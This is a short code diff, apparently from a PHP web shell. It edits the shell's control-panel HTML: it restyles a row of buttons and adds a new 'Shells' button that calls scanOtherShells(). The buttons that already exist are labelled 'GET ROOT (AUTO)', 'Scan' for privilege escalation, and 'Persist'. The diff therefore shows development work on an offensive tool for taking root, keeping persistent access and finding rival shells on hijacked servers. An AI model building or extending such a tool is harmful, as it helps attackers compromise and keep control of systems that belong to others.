@@ -2577,10 +2577,11 @@ function list_dir($path) {
         </div>
         <div style="padding: 10px 15px;">
             <!-- Action Buttons Row -->
-            <div style="display:flex;gap:8px;margin-bottom:10px;">
-                <button id="getRootBtn" onclick="autoGetRoot()" style="flex:2;background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔥 GET ROOT (AUTO)</button>
-                <button onclick="scanPrivesc()" style="flex:1;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
-                <button onclick="installPersistence()" style="flex:1;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
+            <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;">
+                <button id="getRootBtn" onclick="autoGetRoot()" style="flex:2;min-width:150px;background:linear-gradient(135deg,#f44,#f80);color:#fff;font-weight:bold;padding:10px;font-size:14px;border:none;border-radius:4px;cursor:pointer;">🔥 GET ROOT (AUTO)</button>
+                <button onclick="scanPrivesc()" style="flex:1;min-width:80px;background:#0f0;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔍 Scan</button>
+                <button onclick="installPersistence()" style="flex:1;min-width:80px;background:#f80;color:#111;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🔒 Persist</button>
+                <button onclick="scanOtherShells()" style="flex:1;min-width:100px;background:#f44;color:#fff;font-weight:bold;padding:8px;font-size:12px;border:none;border-radius:4px;cursor:pointer;">🕵️ Shells</button>
             </div>
             
             <!-- Status Bar -->
